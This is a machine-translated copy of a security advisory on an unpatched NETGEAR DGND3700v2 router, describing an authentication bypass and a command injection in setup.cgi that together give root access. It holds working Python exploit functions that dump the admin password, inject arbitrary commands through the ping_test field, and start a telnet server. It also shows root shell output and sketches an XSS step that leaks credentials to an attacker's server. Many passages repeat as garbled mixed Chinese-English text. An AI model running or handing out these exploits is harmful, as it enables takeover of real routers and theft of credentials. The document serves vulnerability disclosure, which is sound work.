> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [ssd-disclosure.com](https://ssd-disclosure.com/ssd-advisory-netgear-dgnd3700v2-preauth-root-access/)

**TL;博士**

了解 NETGEAR DGND3700v2 设备中的两个缺陷如何允许远程未经身份验证的攻击者触发绕过身份验证机制并以`root`.

**漏洞摘要**

NETGEAR DGND3700v2 中的两个安全漏洞允许远程攻击者访问`setup.cgi`with`passwordrecoverd.htm`以绕过身份验证机制，随后调用`setup.cgi`with`currentsettings.htm`以通过该`ping_test`功能注入任意命令。

**CVE**

待定

****信用****

一位独立的安全研究人员已向 SSD 安全披露计划报告了这种绕过方式。

**受影响的版本**

*   NETGEAR DGND3700v2（所有固件版本）

**供应商回应**

“NETGEAR 不会针对受影响的产品发布此漏洞的修复程序，因为该产品超出了[安全支持期](https://www.netgear.com/about/eos/)。当前支持的模型不受此漏洞的影响。”

**漏洞分析**

NETGEAR DGND3700v2 存在两个逻辑缺陷，可以远程破坏受影响的设备。这些缺陷已经测试了所有可用的固件版本。

复制
--

根据攻击者所在的位置，有两种方法可以使用该漏洞：LAN 版本（也适用于已打开远程管理的设备，如在此[Shodan 查询](https://www.shodan.io/search?query=realm%3D%22NETGEAR+DGND3700v2%22)中或直接来自 Internet（如在浏览器漏洞中）。

### 局域网/远程管理开启

`exploit.py`可用于从 LAN 端触发问题，如果启用了远程管理。

> python 漏洞利用。py . ' . "' . . . '' “`... '' . ' _______________ == c ( ___ ( o ( ______ ( _ ()) \=\ ) =\ //|\\ //|| \\ // || \\ // || \\ // \\ «Longue vue» 针对 NETGEAR DGND3700v2 的 LAN 漏洞利用用法：Longue vue [ -h ] [ --dump-pwd ] [ --shell ] [ --cmd CMD ] [ --target TARGET ] 可选参数： -h, --help 显示此帮助信息并退出 --转储密码 - 贝壳 --cmd 命令 --target 目标>python exploit.py . ' . " ' . . . ' ' "` . . ' ' . ' _______________ ==c(___(o(______(_() \=\ )=\ //|\\ //|| \\ // || \\ // || \\ // \\ «Longue vue» LAN exploit targeting NETGEAR DGND3700v2 usage: Longue vue [-h] [--dump-pwd] [--shell] [--cmd CMD] [--target TARGET] optional arguments: -h, --help show this help message and exit --dump-pwd --shell --cmd CMD --target TARGET

```
>python exploit.py

           .    '                   .  "   '
                  .  .  .                 '      '
          "`       .   .
                                           '     '
        .    '      _______________
                ==c(___(o(______(_()
                        \=\
                         )=\
                        //|\\
                       //|| \\
                      // ||  \\
                     //  ||   \\
                    //         \\
    «Longue vue» LAN exploit targeting NETGEAR DGND3700v2


usage: Longue vue [-h] [--dump-pwd] [--shell] [--cmd CMD] [--target TARGET]

optional arguments:
  -h, --help       show this help message and exit
  --dump-pwd
  --shell
  --cmd CMD
  --target TARGET
```

这是一个使用它在设备上获取远程 shell 的示例；请注意，`routerlogin.com`应解析为设备 IP：

> python longue-vue。py --目标路由器登录。com --shell[ ... ]获取针对 routerlogin 的 shell。com ..连接前等待几秒钟..进入shell，ctrl+c退出# /bin/ps/bin/ps PID 用户 VSZ 统计命令 1根 1100 S 初始化 2根 0 SW < [ kthreadd ] 3根 0 SW < [迁移/ 0 ] 4根 0 SW [ sirq-high/ 0 ] 5根 0 SW [ sirq-timer/ 0 ] 6根 0 SW [ sirq-net-tx/ 0 ] 7根 0 SW [ sirq-net-rx/ 0 ] 8根 0 SW [ sirq-block/ 0 ] 9根 0 SW [ sirq-tasklet/ 0 ] 10根 0 SW [ sirq-sched/ 0 ] 11根 0 SW [ sirq-hrtimer/ 0 ] 12根 0 SW [ sirq-rcu/ 0 ] 13根 0 SW < [迁移/ 1 ] 14根 0 SW [ sirq-high/ 1 ] 15根 0 SW [ sirq-timer/ 1 ] 16根 0 SW [ sirq-net-tx/ 1 ] 17根 0 SW [ sirq-net-rx/ 1 ] 18根 0 SW [ sirq-block/ 1 ] 19根 0 SW [ sirq-tasklet/ 1 ] 20根 0 SW [ sirq-sched/ 1 ] 21根 0 SW [ sirq-hrtimer/ 1 ] 22根 0 SW [ sirq-rcu/ 1 ] 23根 0 SW < [事件/ 0 ] 24根 0 SW < [事件/ 1 ] 25根 0 SW < [ khelper ] 28根 0 SW < [ async/mgr ] 92根 0 SW < [ kblockd/ 0 ] 93根 0 SW < [ kblockd/ 1 ] 102根 ​​ 0 SW < [ khubd ] 120根 0 SW < [ bpm ] 136根 0 SW [ pdflush ] 137根 0 SW [ pdflush ] 138根 0 SWN [ kswapd0 ] 140根 0 SW < [加密/ 0 ] 141根 0 SW < [加密/ 1 ] 198根 0 SW < [ mtdblockd ] 246根 0 SW [板定时器] 250根 0 SW < [链接监视] 306根 0 SW [ kpAliveWatchdog ] 312根 0 SW [ DSL0 ] 321根 0 SW [ bcmsw ] 322根 0 SW [ bcmsw_timer ] 409根 1500 S /usr/sbin/swmdk 411根 1500 S /usr/sbin/swmdk 412根 1500 S /usr/sbin/swmdk 417根 1272 S /sbin/klogd 419根 808 S /usr/sbin/cmd_agent_ap 421根 0 SWN [ jffs2_gcd_mtd4 ] 422根 0 SWN [ jffs2_gcd_mtd3 ] 423根 0 SWN [ jffs2_gcd_mtd12 ] 424根 0 SWN [ jffs2_gcd_mtd11 ] 425根 0 SWN [ jffs2_gcd_mtd10 ] 426根 0 SWN [ jffs2_gcd_mtd9 ] 427根 0 SWN [ jffs2_gcd_mtd2 ] 428根 0 SWN [ jffs2_gcd_mtd8 ][ ... ]# *** 连接被远程主机关闭 ***打扫干净..加入..- - - - - - - - - - - - - - 完毕 - - - - - - - - - - - -------->python longue-vue.py --target routerlogin.com --shell [...] Getting a shell against routerlogin.com.. Waiting a few seconds before connecting.. Dropping in the shell, exit with ctrl+c # /bin/ps /bin/ps PID USER VSZ STAT COMMAND 1 root 1100 S init 2 root 0 SW< [kthreadd] 3 root 0 SW< [migration/0] 4 root 0 SW [sirq-high/0] 5 root 0 SW [sirq-timer/0] 6 root 0 SW [sirq-net-tx/0] 7 root 0 SW [sirq-net-rx/0] 8 root 0 SW [sirq-block/0] 9 root 0 SW [sirq-tasklet/0] 10 root 0 SW [sirq-sched/0] 11 root 0 SW [sirq-hrtimer/0] 12 root 0 SW [sirq-rcu/0] 13 root 0 SW< [migration/1] 14 root 0 SW [sirq-high/1] 15 root 0 SW [sirq-timer/1] 16 root 0 SW [sirq-net-tx/1] 17 root 0 SW [sirq-net-rx/1] 18 root 0 SW [sirq-block/1] 19 root 0 SW [sirq-tasklet/1] 20 root 0 SW [sirq-sched/1] 21 root 0 SW [sirq-hrtimer/1] 22 root 0 SW [sirq-rcu/1] 23 root 0 SW< [events/0] 24 root 0 SW< [events/1] 25 root 0 SW< [khelper] 28 root 0 SW< [async/mgr] 92 root 0 SW< [kblockd/0] 93 root 0 SW< [kblockd/1] 102 root 0 SW< [khubd] 120 root 0 SW< [bpm] 136 root 0 SW [pdflush] 137 root 0 SW [pdflush] 138 root 0 SWN [kswapd0] 140 root 0 SW< [crypto/0] 141 root 0 SW< [crypto/1] 198 root 0 SW< [mtdblockd] 246 root 0 SW [board-timer] 250 root 0 SW< [linkwatch] 306 root 0 SW [kpAliveWatchdog] 312 root 0 SW [dsl0] 321 root 0 SW [bcmsw] 322 root 0 SW [bcmsw_timer] 409 root 1500 S /usr/sbin/swmdk 411 root 1500 S /usr/sbin/swmdk 412 root 1500 S /usr/sbin/swmdk 417 root 1272 S /sbin/klogd 419 root 808 S /usr/sbin/cmd_agent_ap 421 root 0 SWN [jffs2_gcd_mtd4] 422 root 0 SWN [jffs2_gcd_mtd3] 423 root 0 SWN [jffs2_gcd_mtd12] 424 root 0 SWN [jffs2_gcd_mtd11] 425 root 0 SWN [jffs2_gcd_mtd10] 426 root 0 SWN [jffs2_gcd_mtd9] 427 root 0 SWN [jffs2_gcd_mtd2] 428 root 0 SWN [jffs2_gcd_mtd8] [...] # *** Connection closed by remote host *** Cleaning up.. Joining.. ----------------------------Done----------------------------

```
>python longue-vue.py --target routerlogin.com --shell
[...]
Getting a shell against routerlogin.com..
Waiting a few seconds before connecting..
Dropping in the shell, exit with ctrl+c
# /bin/ps
/bin/ps
  PID USER       VSZ STAT COMMAND
    1 root      1100 S    init
    2 root         0 SW<  [kthreadd]
    3 root         0 SW<  [migration/0]
    4 root         0 SW   [sirq-high/0]
    5 root         0 SW   [sirq-timer/0]
    6 root         0 SW   [sirq-net-tx/0]
    7 root         0 SW   [sirq-net-rx/0]
    8 root         0 SW   [sirq-block/0]
    9 root         0 SW   [sirq-tasklet/0]
   10 root         0 SW   [sirq-sched/0]
   11 root         0 SW   [sirq-hrtimer/0]
   12 root         0 SW   [sirq-rcu/0]
   13 root         0 SW<  [migration/1]
   14 root         0 SW   [sirq-high/1]
   15 root         0 SW   [sirq-timer/1]
   16 root         0 SW   [sirq-net-tx/1]
   17 root         0 SW   [sirq-net-rx/1]
   18 root         0 SW   [sirq-block/1]
   19 root         0 SW   [sirq-tasklet/1]
   20 root         0 SW   [sirq-sched/1]
   21 root         0 SW   [sirq-hrtimer/1]
   22 root         0 SW   [sirq-rcu/1]
   23 root         0 SW<  [events/0]
   24 root         0 SW<  [events/1]
   25 root         0 SW<  [khelper]
   28 root         0 SW<  [async/mgr]
   92 root         0 SW<  [kblockd/0]
   93 root         0 SW<  [kblockd/1]
  102 root         0 SW<  [khubd]
  120 root         0 SW<  [bpm]
  136 root         0 SW   [pdflush]
  137 root         0 SW   [pdflush]
  138 root         0 SWN  [kswapd0]
  140 root         0 SW<  [crypto/0]
  141 root         0 SW<  [crypto/1]
  198 root         0 SW<  [mtdblockd]
  246 root         0 SW   [board-timer]
  250 root         0 SW<  [linkwatch]
  306 root         0 SW   [kpAliveWatchdog]
  312 root         0 SW   [dsl0]
  321 root         0 SW   [bcmsw]
  322 root         0 SW   [bcmsw_timer]
  409 root      1500 S    /usr/sbin/swmdk
  411 root      1500 S    /usr/sbin/swmdk
  412 root      1500 S    /usr/sbin/swmdk
  417 root      1272 S    /sbin/klogd
  419 root       808 S    /usr/sbin/cmd_agent_ap
  421 root         0 SWN  [jffs2_gcd_mtd4]
  422 root         0 SWN  [jffs2_gcd_mtd3]
  423 root         0 SWN  [jffs2_gcd_mtd12]
  424 root         0 SWN  [jffs2_gcd_mtd11]
  425 root         0 SWN  [jffs2_gcd_mtd10]
  426 root         0 SWN  [jffs2_gcd_mtd9]
  427 root         0 SWN  [jffs2_gcd_mtd2]
  428 root         0 SWN  [jffs2_gcd_mtd8]
[...]
# *** Connection closed by remote host ***
Cleaning up..
Joining..
----------------------------Done----------------------------
```

### 来自网络

设置攻击最简单的方法是`python -m http.server`从`web/`目录开始；然后编辑`hosts`操作系统的文件（`C:\Windows\System32\drivers\etc\hosts`在 Windows 上，`/etc/hosts`在 Linux 上）并添加一个条目：

[ ... ]<你的本地IP > longue-vue。网[...] <your local ip> longue-vue.net

```
[...]
<your local ip> longue-vue.net
```

这是一个例子：

[ ... ]192.168 。0 . 2长视频。网[...] 192.168.0.2 longue-vue.net

```
[...]
192.168.0.2 longue-vue.net
```

完成此操作后，您可以打开浏览器（我们仅在 Microsoft Edge Chromium 上对此进行了测试；但我们不明白为什么它不能在常规 Chrome 上运行）并导航到`longue-vue.net`并按下按钮。

漏洞
--

使用了两个漏洞；身份验证绕过（以及会话绕过）和命令注入。

大多数 Web 功能都是在 CGI 可执行文件中实现的，很可能是用 C 编写的。HTTP 服务器基于[mini_httpd](https://github.com/peter-leonov/mini_httpd/blob/master/mini_httpd.c)，并进行了一些修改/定制。`mini_httpd`是设置环境变量的过程，CGI 可执行文件用来理解它必须为用户服务的请求。

实现了大部分（可能是全部）功能的 CGI 可执行文件是`setup.cgi`.

### 绕过身份验证/会话

Web 身份验证在此设备上“工作”的方式使用了非常糟糕的设计。基本上，Web 服务器`NEED_AUTH`在调用之前设置了一个环境变量`setup.cgi`，然后`setup.cgi`相应地运行身份验证代码。

现在，因为有些资源需要在没有身份验证的情况下可用（例如当您输入错误凭据时获得的页面），所以 http 服务器会尝试确定资源是否需要进行身份验证。

.data:0041EB20 SpecialNonAuthPages:.word aCurrentsetting.data:0041EB20 # 数据外部参考：handle_request+12F8↑o.data:0041EB20 #main+BF0↑o.data:0041EB20 #“当前设置.htm”.data:0041EB24 .word aUpdateSettingH # "update_setting.htm".data:0041EB28 .word aDebuginfoHtm # "debuginfo.htm".data:0041EB2C .word aImportantUpdat # "important_update.htm".data:0041EB30 .word aMNUtopHtm # "MNU_top.htm".data:0041EB34 .word aWarningPgHtm # "warning_pg.htm".data:0041EB38 .word aMultiLoginHtml # "multi_login.html".data:0041EB3C .word aHtpwdRecoveryC # "htpwd_recovery.cgi".data:0041EB40 .word a401RecoveryHtm #“401_recovery.htm”.data:0041EB44 .word a401AccessDenie # "401_access_denied.htm".data:0041EB20 SpecialNonAuthPages:.word aCurrentsetting .data:0041EB20 # DATA XREF: handle_request+12F8↑o .data:0041EB20 # main+BF0↑o .data:0041EB20 # "currentsetting.htm" .data:0041EB24 .word aUpdateSettingH # "update_setting.htm" .data:0041EB28 .word aDebuginfoHtm # "debuginfo.htm" .data:0041EB2C .word aImportantUpdat # "important_update.htm" .data:0041EB30 .word aMNUtopHtm # "MNU_top.htm" .data:0041EB34 .word aWarningPgHtm # "warning_pg.htm" .data:0041EB38 .word aMultiLoginHtml # "multi_login.html" .data:0041EB3C .word aHtpwdRecoveryC # "htpwd_recovery.cgi" .data:0041EB40 .word a401RecoveryHtm # "401_recovery.htm" .data:0041EB44 .word a401AccessDenie # "401_access_denied.htm"

```
.data:0041EB20 SpecialNonAuthPages:.word aCurrentsetting
.data:0041EB20                           # DATA XREF: handle_request+12F8↑o
.data:0041EB20                           # main+BF0↑o
.data:0041EB20                           # "currentsetting.htm"
.data:0041EB24  .word aUpdateSettingH    # "update_setting.htm"
.data:0041EB28  .word aDebuginfoHtm      # "debuginfo.htm"
.data:0041EB2C  .word aImportantUpdat    # "important_update.htm"
.data:0041EB30  .word aMNUtopHtm         # "MNU_top.htm"
.data:0041EB34  .word aWarningPgHtm      # "warning_pg.htm"
.data:0041EB38  .word aMultiLoginHtml    # "multi_login.html"
.data:0041EB3C  .word aHtpwdRecoveryC    # "htpwd_recovery.cgi"
.data:0041EB40  .word a401RecoveryHtm    # "401_recovery.htm"
.data:0041EB44  .word a401AccessDenie    # "401_access_denied.htm"
```

一种方法是查看 URL 是否包含_currentsetting.htm_（例如）。

// .text:0040609C handle_requestchar * handle_request (){ //... CurrSpecialPagePtr = ( const char ** ) SpecialNonAuthPages; 而( 1 ) { CurrSpecialPage = *CurrSpecialPagePtr; 如果( !*CurrSpecialPagePtr ) 休息; ++CurrSpecialPagePtr; // 如果我们找到一个命中，我们特例请求 if ( strstr ( v60, CurrSpecialPage ) ) 转到 LABEL_171； } 如果（！strstr （v60，“.gif” ） && ！strstr （v60，“.css” ） && ！strstr ( v60, ".js" ) && ！strstr ( v60, ".xml" ) && ！strstr （v60，“.jpg” ）） { 转到 LABEL_173； }标签_171： 需要验证 = 0 ;// .text:0040609C handle_request char *handle_request() { //... CurrSpecialPagePtr = (const char **)SpecialNonAuthPages; while ( 1 ) { CurrSpecialPage = *CurrSpecialPagePtr; if ( !*CurrSpecialPagePtr ) break; ++CurrSpecialPagePtr; // If we find a hit, we special case the request if ( strstr(v60, CurrSpecialPage) ) goto LABEL_171; } if ( !strstr(v60, ".gif") && !strstr(v60, ".css") && !strstr(v60, ".js") && !strstr(v60, ".xml") && !strstr(v60, ".jpg") ) { goto LABEL_173; } LABEL_171: NeedAuth = 0;

```
// .text:0040609C handle_request
char *handle_request()
{
  //...
  CurrSpecialPagePtr = (const char **)SpecialNonAuthPages;
  while ( 1 )
  {
    CurrSpecialPage = *CurrSpecialPagePtr;
    if ( !*CurrSpecialPagePtr )
      break;
    ++CurrSpecialPagePtr;
    // If we find a hit, we special case the request
    if ( strstr(v60, CurrSpecialPage) )
      goto LABEL_171;
  }
  if ( !strstr(v60, ".gif")
    && !strstr(v60, ".css")
    && !strstr(v60, ".js")
    && !strstr(v60, ".xml")
    && !strstr(v60, ".jpg") )
  {
    goto LABEL_173;
  }
LABEL_171:
  NeedAuth = 0;
```

显然，攻击者可以很容易地滥用这一点，只需`foo=currentsetting.htm`在攻击者想要访问的每个经过身份验证的 URL 中附加即可。

def dump_http_pwd （目标）： '' '绕过身份验证并检索访问所需的凭据 管理面板。'' r = 请求。获取( f 'http://{target}/setup.cgi?next_file=passwordrecovered.htm&foo=currentsetting.htm' ) 内容 = r。内容。解码() 登录，密码=重新。findall ( r 'Router Admin (?:Username|Password)</span>: (.+)</td>' , content ) 返回登录名，密码def dump_http_pwd(target): '''Bypass authentication and retrieve credentials needed to access the administration panel.''' r = requests.get(f'http://{target}/setup.cgi?next_file=passwordrecovered.htm&foo=currentsetting.htm') content = r.content.decode() login, pwd = re.findall(r'Router Admin (?:Username|Password)</span>:&nbsp;(.+)</td>', content) return login, pwd

```
def dump_http_pwd(target):
    '''Bypass authentication and retrieve credentials needed to access
    the administration panel.'''
    r = requests.get(f'http://{target}/setup.cgi?next_file=passwordrecovered.htm&foo=currentsetting.htm')
    content = r.content.decode()
    login, pwd = re.findall(r'Router Admin (?:Username|Password)</span>:&nbsp;(.+)</td>', content)
    return login, pwd
```

然后，`setup.cgi`生成：

.text:00405BAC move $a1, $zero # handler.text:00405BB0 lw $gp, 0x2B38 + var_2B10 ( $sp ).text:00405BB4 移动 $a0, $s1 # 路径.text:00405BB8 la $t9, execve.text:00405BBC 移动 $a1, $s0 # argv.text:00405BC0 jalr $t9 ; 执行.text:00405BC4 移动 $a2, $s2 # envp.text:00405BAC move $a1, $zero # handler .text:00405BB0 lw $gp, 0x2B38+var_2B10($sp) .text:00405BB4 move $a0, $s1 # path .text:00405BB8 la $t9, execve .text:00405BBC move $a1, $s0 # argv .text:00405BC0 jalr $t9 ; execve .text:00405BC4 move $a2, $s2 # envp

```
.text:00405BAC   move    $a1, $zero       # handler
.text:00405BB0   lw      $gp, 0x2B38+var_2B10($sp)
.text:00405BB4   move    $a0, $s1         # path
.text:00405BB8   la      $t9, execve
.text:00405BBC   move    $a1, $s0         # argv
.text:00405BC0   jalr    $t9 ; execve
.text:00405BC4   move    $a2, $s2         # envp
```

现在，这是`setup.cgi`'s main 的精简版：

int __cdecl main ( int argc, const char **argv, const char **envp ){ // ... strcpy ( SessionFilepath, "/tmp/SessionFile" ) ; memset ( &SessionFilepath [ 17 ] , 0 , 0x6Fu ) ; // ... QueryStringIdPtr = strstr ( QueryString, "id=" ) ; 如果( !QueryStringIdPtr ) { // ... } QueryStringId = strtol ( QueryStringIdPtr + 3 , &QueryStringAfterIdPtr, 16 ) ; 如果( QueryStringAfterIdPtr ) { QueryStringSpPtr = strstr ( QueryStringAfterIdPtr, "sp=" ) ; 如果( QueryStringSpPtr ) strcat ( SessionFilepath, QueryStringSpPtr + 3 ) ; } SessionId = ReadSessionId ( SessionFilepath ) ; ConFd__ = fopen ( "/dev/console" , "w" ) ; 如果（ConFd__ ） { fprintf （ConFd__，“[%s - %d]：” ，“sid_verify” ，201 ）； fprintf ( ConFd__, "<%s> your_sid = <%08x>, my_sid = <%08x> \n" , SessionFilepath, QueryStringId, SessionId ) ; fflush ( ConFd__ ) ; fclose ( ConFd__ ) ; } 如果（QueryStringId！= SessionId ） 转到发送禁止； // ...}int __cdecl main(int argc, const char **argv, const char **envp) { // ... strcpy(SessionFilepath, "/tmp/SessionFile"); memset(&SessionFilepath[17], 0, 0x6Fu); // ... QueryStringIdPtr = strstr(QueryString, "id="); if ( !QueryStringIdPtr ) { // ... } QueryStringId = strtol(QueryStringIdPtr + 3, &QueryStringAfterIdPtr, 16); if ( QueryStringAfterIdPtr ) { QueryStringSpPtr = strstr(QueryStringAfterIdPtr, "sp="); if ( QueryStringSpPtr ) strcat(SessionFilepath, QueryStringSpPtr + 3); } SessionId = ReadSessionId(SessionFilepath); ConFd__ = fopen("/dev/console", "w"); if ( ConFd__ ) { fprintf(ConFd__, "[ %s - %d ] : ", "sid_verify", 201); fprintf(ConFd__, "<%s> your_sid = <%08x>, my_sid = <%08x> \n", SessionFilepath, QueryStringId, SessionId); fflush(ConFd__); fclose(ConFd__); } if ( QueryStringId != SessionId ) goto SendForbidden; // ... }

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  // ...
  strcpy(SessionFilepath, "/tmp/SessionFile");
  memset(&SessionFilepath[17], 0, 0x6Fu);
  // ...
  QueryStringIdPtr = strstr(QueryString, "id=");
  if ( !QueryStringIdPtr )
  {
      // ...
  }
  QueryStringId = strtol(QueryStringIdPtr + 3, &QueryStringAfterIdPtr, 16);
  if ( QueryStringAfterIdPtr )
  {
    QueryStringSpPtr = strstr(QueryStringAfterIdPtr, "sp=");
    if ( QueryStringSpPtr )
      strcat(SessionFilepath, QueryStringSpPtr + 3);
  }
  SessionId = ReadSessionId(SessionFilepath);
  ConFd__ = fopen("/dev/console", "w");
  if ( ConFd__ )
  {
    fprintf(ConFd__, "[ %s - %d ] : ", "sid_verify", 201);
    fprintf(ConFd__, "<%s> your_sid = <%08x>, my_sid = <%08x> \n", SessionFilepath, QueryStringId, SessionId);
    fflush(ConFd__);
    fclose(ConFd__);
  }
  if ( QueryStringId != SessionId )
    goto SendForbidden;
  // ...
}
```

该功能基本上是在这些检查之后进行的；我们还没有遇到身份验证。这就是我所说的“会话绕过”，我不太确定它是否是真正的安全措施。  
无论如何，它的工作方式是代码创建一个名为的文件`/tmp/SessionFileXXX`，其中写入了一个整数（是的，它还有一个远程预授权堆栈溢出）。现在，当在 URL 中`setup.cgi`接收到`sp=XXX`参数时，它会将其值连接到`/tmp/SessionFileXXX`in `SessionFilePath`。

之后`ReadSessionId`用`SessionFilepath`;调用 这是函数的样子：

int __fastcall ReadSessionId ( const char *Filename ){ 文件*FD； 整数会话ID； 会话 ID = 0 ; Fd = fopen （文件名，“r” ）； 如果( !Fd ) 返回会话 ID； fscanf ( fd, "%x" , &SessionId ) ; fclose ( fd ) ; 返回会话 ID；}int __fastcall ReadSessionId(const char *Filename) { FILE *Fd; int SessionId; SessionId = 0; Fd = fopen(Filename, "r"); if ( !Fd ) return SessionId; fscanf(Fd, "%x", &SessionId); fclose(Fd); return SessionId; }

```
int __fastcall ReadSessionId(const char *Filename)
{
  FILE *Fd;
  int SessionId;

  SessionId = 0;
  Fd = fopen(Filename, "r");
  if ( !Fd )
    return SessionId;
  fscanf(Fd, "%x", &SessionId);
  fclose(Fd);
  return SessionId;
}
```

该函数非常简单：它基本上打开传递的文件路径，将一个十六进制字符串读入一个整数`SessionId`并返回它。调用者只是将传入`id=`的值与存储在文件中的值进行比较。如果秘密匹配，则代码继续运行，否则它将向用户发送_禁止_的答案。

这很容易绕过，我们可以简单地通过`sp=1337`设备上不存在的；`fopen`将失败，它会返回`SessionId`初始化为零。这意味着我们可以`id=0`绕过会话检查。

def cmd_exec （目标，cmd，静默=假）： r = 请求。发布（ f 'http://{target}/setup.cgi?id=0&sp=1337foo=currentsetting.htm' ,def cmd_exec(target, cmd, silent = False): r = requests.post( f'http://{target}/setup.cgi?id=0&sp=1337foo=currentsetting.htm',

```
def cmd_exec(target, cmd, silent = False):
    r = requests.post(
        f'http://{target}/setup.cgi?id=0&sp=1337foo=currentsetting.htm',
```

代码继续运行，您可以根据收到的 GET 参数或 POST 请求触发不同的功能。以下是函数的样子：

int HandleSetupCgi (){ 整数列表； const char *NextFile; const char *ActionName; 列表 = cgi_input_parse () ; fflush (标准输出) ; 如果（check_need_logout （列表）） 返回句柄注销（列表）； int HandleSetupCgi() { int List; const char *NextFile; const char *ActionName; List = cgi_input_parse(); fflush(stdout); if ( check_need_logout(List) ) return handle_logout(List);

```
int HandleSetupCgi()
{
  int List;
  const char *NextFile;
  const char *ActionName;

  List = cgi_input_parse();
  fflush(stdout);
  if ( check_need_logout(List) )
    return handle_logout(List);
```

`cgi_input_parse`基本上解析查询字符串并创建键/值项列表。该列表被传递给各种函数，而不是一遍又一遍地解析查询字符串。

我们`check_need_logout`终于有了`NEED_AUTH`我之前提到的变量。

bool __fastcall check_need_logout ( int List ){ // ... LoginIp = getenv ( "LOGIN_IP" ) ; NeedAuth = getenv （“NEED_AUTH” ）； // ... 如果（需要验证） { 返回= 0 ; if ( *NeedAuth == '0' ) 返回返回； }//...}bool __fastcall check_need_logout(int List) { // ... LoginIp = getenv("LOGIN_IP"); NeedAuth = getenv("NEED_AUTH"); // ... if ( NeedAuth ) { Return = 0; if ( *NeedAuth == '0' ) return Return; } //... }

```
bool __fastcall check_need_logout(int List)
{
  // ...
  LoginIp = getenv("LOGIN_IP");
  NeedAuth = getenv("NEED_AUTH");
  // ...
  if ( NeedAuth )
  {
    Return = 0;
    if ( *NeedAuth == '0' )
      return Return;
  }
 //...
}
```

该函数需要返回零，以便调用者公开功能。如果变量`NEED_AUTH`存在于环境中，代码会检查它是否为“0”，如果是，则返回 0，这正是我们想要的。由于 http 服务器中利用的问题，`NEED_AUTH`将设置为`0`，这就是我们绕过身份验证的方式。

此时，我们可以访问 Web UI 公开的任何功能，这意味着我们可以泄露 HTTP 密码等。

### 执行任意命令

`setup.cgi`实现了一个奇怪的命令模型，其中一个允许您 ping 任意 IP（它在 Advanced > Administration > Diagnostics 中可用）。实现这一点的代码定义如下：

int __fastcall handler_ping_test ( int a1 ){ 常量字符 *v2; // $s2 常量字符 *v3; // $v0 字符 v5 [ 128 ] ; // [sp+18h] [-80h] BYREF v2 = ( const char * ) find_val ( a1, ( int ) "c4_IPAddr" ) ; 如果( !v2 ) v2 = &nptr; 如果（！strchr （v2，'-' ）&& ！strchr （v2，';' ）） { sprintf ( v5, "/bin/ping -c 4 %s" , v2 ) ; myPipe ( v5, &ping_output ) ; } v3 = ( const char * ) find_val ( a1, ( int ) "next_file" ) ; html_parser ( v3, a1, &key_fun_tab ) ; 返回0 ; }int __fastcall handler_ping_test(int a1) { const char *v2; // $s2 const char *v3; // $v0 char v5[128]; // [sp+18h] [-80h] BYREF v2 = (const char *)find_val(a1, (int)"c4_IPAddr"); if ( !v2 ) v2 = &nptr; if ( !strchr(v2, '-') && !strchr(v2, ';') ) { sprintf(v5, "/bin/ping -c 4 %s", v2); myPipe(v5, &ping_output); } v3 = (const char *)find_val(a1, (int)"next_file"); html_parser(v3, a1, &key_fun_tab); return 0; }

```
int __fastcall handler_ping_test(int a1)
{
  const char *v2; // $s2
  const char *v3; // $v0
  char v5[128]; // [sp+18h] [-80h] BYREF

  v2 = (const char *)find_val(a1, (int)"c4_IPAddr");
  if ( !v2 )
    v2 = &nptr;
  if ( !strchr(v2, '-') && !strchr(v2, ';') )
  {
    sprintf(v5, "/bin/ping -c 4 %s", v2);
    myPipe(v5, &ping_output);
  }
  v3 = (const char *)find_val(a1, (int)"next_file");
  html_parser(v3, a1, &key_fun_tab);
  return 0;
}
```

这里通过`c4_IPAddr`post 参数进行了简单的注入。我们不能使用的唯一两个字符是`-`和`;`。但这足以运行 LAN 上可用的 telnet 服务器，例如：

def cmd_exec （目标，cmd，静默=假）： '' '绕过身份验证和命令注入`cmd`。' '' r = 请求。发布（ f 'http://{target}/setup.cgi?id=0&sp=1337foo=currentsetting.htm' , { “待办事项” ：“ping_test” ， 'c4_IPAddr' : f '127.0.0.1 && echo SNIPME && {cmd}' , 'next_file' ：'diagping.htm' }) 内容 = r。内容。解码() ping_log =重新。找到所有（ r '<textarea .+ 只读 >(.+)</textarea>' , 内容， 回覆。点 ) _，cmd_content = ping_log [ 0 ] 。拆分（'SNIPME' ，1 ） 如果不沉默： 打印（cmd_content.strip （ ））def spawn_telnetd （目标）： '' '生成 telnet 服务器。' '' cmd_exec (目标, '/bin/utelnetd' , 静默 = True )def cmd_exec(target, cmd, silent = False): '''Bypass authentication and command inject `cmd`.''' r = requests.post( f'http://{target}/setup.cgi?id=0&sp=1337foo=currentsetting.htm', { 'todo' : 'ping_test', 'c4_IPAddr' : f'127.0.0.1 && echo SNIPME && {cmd}', 'next_file' : 'diagping.htm' }) content = r.content.decode() ping_log = re.findall( r'<textarea .+ readonly >(.+)</textarea>', content, re.DOTALL ) _, cmd_content = ping_log[0].split('SNIPME', 1) if not silent: print(cmd_content.strip()) def spawn_telnetd(target): '''Spawn the telnet server.''' cmd_exec(target, '/bin/utelnetd', silent = True)

```
def cmd_exec(target, cmd, silent = False):
    '''Bypass authentication and command inject `cmd`.'''
    r = requests.post(
        f'http://{target}/setup.cgi?id=0&sp=1337foo=currentsetting.htm', {
        'todo' : 'ping_test',
        'c4_IPAddr' : f'127.0.0.1 && echo SNIPME && {cmd}',
        'next_file' : 'diagping.htm'
    })

    content = r.content.decode()
    ping_log = re.findall(
        r'<textarea  .+ readonly >(.+)</textarea>',
        content,
        re.DOTALL
    )
    _, cmd_content = ping_log[0].split('SNIPME', 1)
    if not silent:
        print(cmd_content.strip())

def spawn_telnetd(target):
    '''Spawn the telnet server.'''
    cmd_exec(target, '/bin/utelnetd', silent = True)
```

### 从 Internet 场景中绕过远程 CORS

通过浏览器运行漏洞利用时，出现的一个问题`longue-vue.net`是不允许源读取跨源数据。即使它可以发布/获取并触发上面讨论的问题，它也无法读取结果。

绕过这一点的技巧是将上面的命令执行漏洞转换为创建 XSS（运行`/bin/echo PAYLOAD`）。XSS 有效载荷在路由器源的上下文中运行，并且能够将数据泄露给攻击者服务器。这就是如何实现 HTTP 凭据的泄漏：

